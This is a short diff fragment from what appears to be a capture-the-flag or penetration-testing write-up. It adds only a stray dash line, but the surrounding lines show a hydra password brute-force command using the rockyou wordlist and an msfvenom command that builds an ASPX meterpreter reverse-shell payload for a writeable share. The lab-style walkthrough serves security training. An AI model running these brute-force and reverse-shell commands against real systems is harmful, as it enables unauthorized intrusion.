@@ -20,6 +20,7 @@ sudo hydra -s 80 -L ~/path/to/our/nameslist -P /usr/share/wordlists/rockyou.txt 
 ```
 
 Since the network share from ‘test’ is writeable, we can use it for a reverse shell.
+-
 
 ```
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<our ip> lport=1234 -f aspx -o shell.aspx
